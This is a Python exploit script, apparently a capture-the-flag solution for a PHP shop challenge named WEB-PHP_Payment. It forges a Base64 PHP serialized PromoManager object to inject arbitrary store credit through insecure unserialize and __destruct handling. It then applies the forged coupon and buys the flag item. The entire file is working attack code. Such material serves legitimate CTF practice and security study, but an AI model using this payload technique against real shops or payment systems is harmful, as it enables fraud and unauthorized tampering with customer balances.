#!/usr/bin/env python3
import argparse
import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


def build_coupon(credit: int, code: str = "VIP") -> str:
    serialized = (
        f'O:12:"PromoManager":2:{{'
        f's:12:"promo_credit";i:{credit};'
        f's:10:"promo_code";s:{len(code)}:"{code}";'
        f"}}"
    )
    return base64.b64encode(serialized.encode()).decode()


def request_json(opener: urllib.request.OpenerDirector, url: str, data: dict | None = None) -> dict:
    encoded = None
    headers = {}
    if data is not None:
        encoded = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(url, data=encoded, headers=headers)
    try:
        with opener.open(req) as resp:
            body = resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        raise RuntimeError(f"HTTP {exc.code} for {url}: {body}") from exc
    except urllib.error.URLError as exc:
        raise RuntimeError(f"Request failed for {url}: {exc}") from exc

    try:
        return json.loads(body)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"Non-JSON response from {url}: {body}") from exc


def extract_flag(message: str) -> str | None:
    match = re.search(r"(flag\{[^}]+\})", message, re.IGNORECASE)
    return match.group(1) if match else None


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Exploit WEB-PHP_Payment by abusing PromoManager unserialize + __destruct session crediting."
    )
    parser.add_argument("base_url", help="Target base URL, e.g. http://127.0.0.1:8080")
    parser.add_argument("--credit", type=int, default=100000, help="Coupon credit to inject")
    parser.add_argument("--code", default="VIP", help="Arbitrary promo code label")
    parser.add_argument("--print-payload", action="store_true", help="Only print the Base64 coupon payload")
    args = parser.parse_args()

    coupon = build_coupon(args.credit, args.code)
    if args.print_payload:
        print(coupon)
        return 0

    base_url = args.base_url.rstrip("/")
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    try:
        with opener.open(base_url + "/") as resp:
            resp.read()
    except Exception as exc:  # noqa: BLE001
        print(f"[!] Failed to initialize session: {exc}", file=sys.stderr)
        return 1

    print(f"[+] Coupon payload: {coupon}")

    try:
        apply_resp = request_json(opener, base_url + "/api/apply_coupon.php", {"coupon": coupon})
        print(f"[+] apply_coupon.php => {apply_resp}")

        buy_resp = request_json(opener, base_url + "/buy.php", {"item": "flag"})
        print(f"[+] buy.php => {buy_resp}")
    except RuntimeError as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    message = buy_resp.get("message", "")
    flag = extract_flag(message)
    if flag:
        print(f"[+] Flag: {flag}")
        return 0

    print("[!] Exploit sent, but no flag pattern was found in the response.", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
